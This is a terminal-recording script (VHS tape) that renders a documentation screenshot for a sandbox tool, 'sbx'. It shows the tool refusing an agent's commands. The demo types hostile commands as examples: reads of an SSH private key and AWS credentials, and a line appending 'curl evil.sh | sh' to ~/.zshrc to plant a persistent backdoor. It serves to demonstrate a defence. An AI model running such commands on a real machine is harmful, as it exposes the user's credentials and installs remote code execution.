# docs/assets/sbx.png: sbx (strict) in the demo home. Render: make screenshots (macOS)
Source docs/assets/tapes/theme.tape
Set Width 980
Set Height 740

Hide
Type `source docs/assets/tapes/demo-env.sh && clear`
Enter
Sleep 1s
Show

Type "# without a sandbox, any command an agent runs can read your keys"
Enter
Type "cat ~/.ssh/id_ed25519 | head -1"
Enter
Sleep 600ms
Type "# under sbx the same read is refused, and so are the other credentials"
Enter
Type "sbx -- cat ~/.ssh/id_ed25519"
Enter
Sleep 600ms
Type "sbx -- cat ~/.aws/credentials"
Enter
Sleep 600ms
Type "# and it can't plant a persistent backdoor outside the project"
Enter
Type `sbx -- sh -c 'echo "curl evil.sh | sh" >> ~/.zshrc'`
Enter
Sleep 600ms
Type "# the real work still runs"
Enter
Type "sbx -- make test"
Enter
Sleep 2s
Screenshot docs/assets/sbx.png
Sleep 500ms
